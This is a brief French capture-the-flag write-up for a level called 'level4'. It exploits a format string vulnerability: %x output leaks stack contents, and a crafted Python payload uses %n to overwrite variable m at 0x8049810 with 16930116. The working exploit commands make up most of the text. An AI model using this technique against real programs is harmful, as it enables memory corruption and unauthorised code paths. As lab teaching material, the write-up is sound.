# level4

# le début est le même que pour le evel précedent mais cette fois si la variable m est comparé a 16930116

$ echo "AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
AAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
$

# On voit que le buffer est a la 12e place dans la stack et donc la changer par l'adresse de m => 0x8049810

$ python -c 'print "\x10\x98\x04\x08" + "%x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
$

# on fait la même chose que pour le level3 mais avec un %d car le chiffre comparer est trop long sinon

$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4
$